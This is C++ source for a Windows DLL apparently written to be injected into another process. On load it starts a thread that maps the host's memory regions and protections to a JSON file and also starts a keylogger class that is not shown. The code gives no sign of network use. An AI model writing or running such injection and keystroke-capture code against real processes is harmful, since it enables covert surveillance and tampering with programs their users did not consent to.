#include "debug/dbg_console/console.h"
#include "modules/module_manager.h"
#include <psapi.h>
#include <windows.h>
#include <nlohmann/json.hpp> // Include the JSON library
#include <fstream>
#include <spdlog/spdlog.h>

using json = nlohmann::json;

// Helper function to convert protection constants to readable string
std::string GetProtectionString(DWORD protect) {
  std::string perms;

  // Access type
  if (protect & PAGE_EXECUTE)
    perms += "EXECUTE ";
  if (protect & PAGE_EXECUTE_READ)
    perms += "EXECUTE_READ ";
  if (protect & PAGE_EXECUTE_READWRITE)
    perms += "EXECUTE_READWRITE ";
  if (protect & PAGE_EXECUTE_WRITECOPY)
    perms += "EXECUTE_WRITECOPY ";
  if (protect & PAGE_READONLY)
    perms += "READONLY ";
  if (protect & PAGE_READWRITE)
    perms += "READWRITE ";
  if (protect & PAGE_WRITECOPY)
    perms += "WRITECOPY ";
  if (protect & PAGE_NOACCESS)
    perms += "NOACCESS ";

  // Modifiers
  if (protect & PAGE_GUARD)
    perms += "GUARD ";
  if (protect & PAGE_NOCACHE)
    perms += "NOCACHE ";
  if (protect & PAGE_WRITECOMBINE)
    perms += "WRITECOMBINE ";

  if (perms.empty())
    perms = "UNKNOWN";
  return perms;
}

// Dump the permissions of the program it was injected into in JSON format
void dumpPermissions() {
  HANDLE hProcess = GetCurrentProcess();
  MEMORY_BASIC_INFORMATION mbi;
  unsigned char *address = nullptr;

  json memoryRegions = json::array(); // Array to hold all memory regions

  spdlog::info("Dumping memory permissions for process PID: {}",
               GetCurrentProcessId());

  while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
    // Skip free memory regions
    if (mbi.State == MEM_COMMIT || mbi.State == MEM_RESERVE) {
      json regionInfo;

      std::string state = (mbi.State == MEM_COMMIT) ? "COMMITTED" : "RESERVED";
      std::string type;
      switch (mbi.Type) {
      case MEM_IMAGE:
        type = "IMAGE";
        break;
      case MEM_MAPPED:
        type = "MAPPED";
        break;
      case MEM_PRIVATE:
        type = "PRIVATE";
        break;
      default:
        type = "UNKNOWN";
        break;
      }

      regionInfo["base_address"] = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
      regionInfo["size"] = mbi.RegionSize;
      regionInfo["state"] = state;
      regionInfo["type"] = type;
      regionInfo["protection"] = GetProtectionString(mbi.Protect);

      // Try to get module name if this is an image region
      if (mbi.Type == MEM_IMAGE) {
        char moduleName[MAX_PATH];
        if (GetModuleFileNameExA(hProcess, (HMODULE)mbi.BaseAddress, moduleName,
                                 MAX_PATH)) {
          regionInfo["module"] = moduleName;
        }
      }

      memoryRegions.push_back(regionInfo); // Add region info to the array
    }

    address += mbi.RegionSize;
  }

  // Write JSON to a file
  std::ofstream file("memory_permissions.json");
  if (file.is_open()) {
    file << memoryRegions.dump(4); // Pretty print with 4 spaces indentation
    file.close();
    spdlog::info("Memory permissions dumped to memory_permissions.json");
  } else {
    spdlog::error("Failed to open file for writing JSON.");
  }

  spdlog::info("Permission dump completed");
}

// Usage example
void DumpInput() {
  KeyLogger logger;
  logger.StartLogging();
}

int main() {
  DebugConsole console(true);
  console.Initialize();

  dumpPermissions();
  DumpMemoryInfo();
  DumpInput();

  return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD fdwReason,
                               LPVOID lpRes) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)main, 0, 0, 0);
  } else if (fdwReason == DLL_PROCESS_DETACH) {
    FreeConsole();
  }
  return 1;
}